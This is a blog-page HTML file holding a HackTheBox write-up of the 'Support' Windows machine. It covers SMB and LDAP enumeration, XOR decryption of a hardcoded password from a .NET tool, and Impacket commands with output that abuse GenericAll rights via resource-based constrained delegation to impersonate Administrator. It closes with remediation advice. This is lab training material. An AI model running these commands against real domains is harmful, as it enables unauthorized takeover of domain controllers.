@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Support // Cyber security blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="blackcaesar0" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.4566c05e79be04e22fdb60fe026660a374366519139306a7223d2cab6fb660db.css" />
+    
+    <link rel="stylesheet" href="/css/custom.min.5af53ff6a9267e24ee96c3f1312dd379808c5a82b25f008d9e402843955e4f21.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Support">
+  <meta name="twitter:description" content="HackTheBox Writeup – Support Author: blackcaesar0
+Team: Offensive Security Initiative (OSI)
+Machine Name: Support
+Difficulty: Easy
+Operating System: Windows
+Category: Active Directory, Privilege Escalation
+Overview Target: support.htb,dc.support.htb Objective: Gain user and administrator access Techniques Used: SMB and LDAP enumeration Reverse engineering a .NET executable using dnSpy LDAP user enumeration WinRM shell access Abuse of GenericAll rights Resource-Based Constrained Delegation (RBCD) Kerberos ticket impersonation Initial Enumeration Nmap Scan Performed a comprehensive Nmap scan to identify open ports and services. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-19 20:41:54Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-05-19T20:42:11 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 2m32s SMB Enumeration Enumerated SMB shares and discovered a publicly accessible share named support-tools containing a file UserInfo.exe.zip.">
+
+    <meta property="og:url" content="https://blackcaesar0.com/hackthebox/support/">
+  <meta property="og:site_name" content="Cyber security blog">
+  <meta property="og:title" content="Support">
+  <meta property="og:description" content="HackTheBox Writeup – Support Author: blackcaesar0
+Team: Offensive Security Initiative (OSI)
+Machine Name: Support
+Difficulty: Easy
+Operating System: Windows
+Category: Active Directory, Privilege Escalation
+Overview Target: support.htb,dc.support.htb Objective: Gain user and administrator access Techniques Used: SMB and LDAP enumeration Reverse engineering a .NET executable using dnSpy LDAP user enumeration WinRM shell access Abuse of GenericAll rights Resource-Based Constrained Delegation (RBCD) Kerberos ticket impersonation Initial Enumeration Nmap Scan Performed a comprehensive Nmap scan to identify open ports and services. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-19 20:41:54Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-05-19T20:42:11 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 2m32s SMB Enumeration Enumerated SMB shares and discovered a publicly accessible share named support-tools containing a file UserInfo.exe.zip.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hackthebox">
+    <meta property="article:published_time" content="2025-05-20T02:36:30+01:00">
+    <meta property="article:modified_time" content="2025-05-20T02:36:30+01:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/dragon.png" alt="blackcaesar0" /></a>
+      <span class="app-header-title">blackcaesar0</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/hackthebox/">Hackthebox</a>
+      </nav>
+      <p>Exploring cybersecurity, ethical hacking, and digital forensics—one exploit at a time.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/blackcaesar0" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-linkedin" viewBox="0 0 24 24" fill="currentColor"><title>LinkedIn</title><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Support</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          May 20, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="hackthebox-writeup--support">HackTheBox Writeup – Support</h1>
+<p><strong>Author</strong>: <strong>blackcaesar0</strong><br>
+<strong>Team</strong>: <strong>Offensive Security Initiative (OSI)</strong><br>
+<strong>Machine Name</strong>: Support<br>
+<strong>Difficulty</strong>: Easy<br>
+<strong>Operating System</strong>: Windows<br>
+<strong>Category</strong>: Active Directory, Privilege Escalation</p>
+<p><img src="/static/support/support.png" alt=""></p>
+<hr>
+<h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Target</strong>: <code>support.htb,dc.support.htb</code></li>
+<li><strong>Objective</strong>: Gain user and administrator access</li>
+<li><strong>Techniques Used</strong>:
+<ul>
+<li>SMB and LDAP enumeration</li>
+<li>Reverse engineering a .NET executable using  <strong>dnSpy</strong></li>
+<li>LDAP user enumeration</li>
+<li>WinRM shell access</li>
+<li>Abuse of <code>GenericAll</code> rights</li>
+<li>Resource-Based Constrained Delegation (RBCD)</li>
+<li>Kerberos ticket impersonation</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<ul>
+<li>Performed a comprehensive Nmap scan to identify open ports and services.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-05-19 20:41:54Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2022|2012|<span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-05-19T20:42:11
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: 2m32s
+</span></span></code></pre></div><hr>
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<ul>
+<li>Enumerated SMB shares and discovered a publicly accessible share named <code>support-tools</code> containing a file <code>UserInfo.exe.zip</code>.</li>
+</ul>
+<p><img src="/static/support/smb_enum.jpg" alt=""></p>
+<p><img src="/static/support/interesting_zip_file.jpg" alt=""></p>
+<hr>
+<h2 id="reverse-engineering-net-executable">Reverse Engineering .NET Executable</h2>
+<p><strong>Tool Used</strong>: <strong>dnSpy</strong><br>
+<strong>File Analyzed</strong>: <code>UserInfo.exe</code></p>
+<ul>
+<li>Decompiled the <code>.NET</code> executable using dnSpy. Identified a hardcoded Base64-encoded string representing an encrypted LDAP password. Located the custom decryption algorithm within the code, which utilized XOR operations.</li>
+</ul>
+<p><img src="/static/support/encrypted_ldap_pass.jpg" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;encrypted_passwd&#34;</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;key&#34;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(enc_password)
+</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> bytearray()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>    decrypted<span style="color:#f92672">.</span>append(data[i] <span style="color:#f92672">^</span> key[i <span style="color:#f92672">%</span> len(key)] <span style="color:#f92672">^</span> <span style="color:#ae81ff">223</span>)
+</span></span><span style="display:flex;"><span>decrypted<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;latin1&#34;</span>)
+</span></span></code></pre></div><hr>
+<h2 id="ldap-enumeration">LDAP Enumeration</h2>
+<ul>
+<li>Used the decrypted LDAP credentials to bind anonymously and search Active Directory. Extracted user accounts and discovered that the <code>support</code> user had a plaintext password stored in their <code>info</code> field.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ldapsearch -H ldap://support.htb -D <span style="color:#e6db74">&#39;ldap@support.htb&#39;</span> -w <span style="color:#e6db74">&#39;ldap_pass&#39;</span> -b <span style="color:#e6db74">&#34;DC=support,DC=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>|less
+</span></span></code></pre></div><p><img src="/static/support/ldapsearch_enum.jpg" alt=""></p>
+<hr>
+<h2 id="gaining-user-access">Gaining User Access</h2>
+<ul>
+<li>Logged into the system via WinRM using the user credentials obtained from LDAP enumeration.</li>
+</ul>
+<p><img src="/static/support/user.jpg" alt=""></p>
+<hr>
+<h2 id="privilege-escalation-bloodhound">Privilege Escalation (BloodHound)</h2>
+<ul>
+<li>Collected domain object data and analyzed it using BloodHound. Found that the <code>support</code> user had <code>GenericAll</code> rights over the domain controller’s computer object.</li>
+</ul>
+<p><img src="/static/support/bloodhound_enum.jpg" alt=""></p>
+<p><strong>Explanation of <code>GenericAll</code></strong>:<br>
+The <code>GenericAll</code> permission grants full control over an Active Directory object, allowing the user to modify any attribute, including delegation settings. This level of access can be exploited to escalate privileges within the domain.</p>
+<hr>
+<h2 id="exploiting-rbcd-resource-based-constrained-delegation">Exploiting RBCD (Resource-Based Constrained Delegation)</h2>
+<ul>
+<li>Abused <code>GenericAll</code> rights to perform RBCD and impersonate the domain Administrator.</li>
+</ul>
+<h3 id="step-1-add-machine-account">Step 1: Add Machine Account</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> addcomputer.py -method SAMR -computer-name <span style="color:#e6db74">&#39;ATTACKERSYSTEM$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;Summer2018!&#39;</span> -dc-host dc.support.htb -domain-netbios support.htb <span style="color:#e6db74">&#39;support.htb/owned_user:pass&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
+</span></span></code></pre></div><h3 id="step-2-configure-delegation">Step 2: Configure Delegation</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> impacket-rbcd -delegate-from <span style="color:#e6db74">&#39;ATTACKERSYSTEM$&#39;</span> -delegate-to <span style="color:#e6db74">&#39;DC$&#39;</span> -action <span style="color:#e6db74">&#39;write&#39;</span> <span style="color:#e6db74">&#39;support.htb/owned_user:pass&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     ATTACKERSYSTEM$   <span style="color:#f92672">(</span>S-1-5-21-1677581083-3380853377-188903654-6101<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="step-3-impersonate-administrator-and-get-tgt">Step 3: Impersonate Administrator and Get TGT</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>getST.py -spn <span style="color:#e6db74">&#39;cifs/dc.support.htb&#39;</span> -impersonate <span style="color:#e6db74">&#39;Administrator&#39;</span> <span style="color:#e6db74">&#39;support.htb/attackersystem$:Summer2018!&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache
+</span></span></code></pre></div><hr>
+<h2 id="root-access-administrator">Root Access (Administrator)</h2>
+<ul>
+<li>Used the forged Kerberos ticket to run <code>psexec.py</code> and obtain a SYSTEM shell on the domain controller.</li>
+</ul>
+<p><img src="/static/support/root.jpg" alt=""></p>
+<hr>
+<h2 id="summary">Summary</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Stage</th>
+          <th>Technique</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Enumeration</td>
+          <td>Nmap, SMB, LDAP</td>
+      </tr>
+      <tr>
+          <td>Initial Access</td>
+          <td>Reverse engineered LDAP credentials</td>
+      </tr>
+      <tr>
+          <td>User Access</td>
+          <td>WinRM login as <code>support</code></td>
+      </tr>
+      <tr>
+          <td>Privilege Escalation</td>
+          <td><code>GenericAll</code> → RBCD → S4U2Proxy impersonation</td>
+      </tr>
+      <tr>
+          <td>Root Access</td>
+          <td>SYSTEM shell via forged Kerberos TGT</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="-remediation-advice">🛡️ Remediation Advice</h2>
+<ul>
+<li><strong>Avoid Hardcoded Credentials</strong>: Never embed secrets in executables.</li>
+<li><strong>Restrict Excessive Permissions</strong>: Limit <code>GenericAll</code> and similar permissions to necessary accounts only.</li>
+<li><strong>Control Machine Account Creation</strong>: Restrict the ability to create machine accounts to trusted users.</li>
+<li><strong>Monitor Delegation Activities</strong>: Implement monitoring for unusual Kerberos delegation activities.</li>
+<li><strong>Protect Sensitive LDAP Fields</strong>: Apply appropriate Access Control Lists (ACLs) to sensitive LDAP attributes like <code>info</code>.</li>
+</ul>
+<hr>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
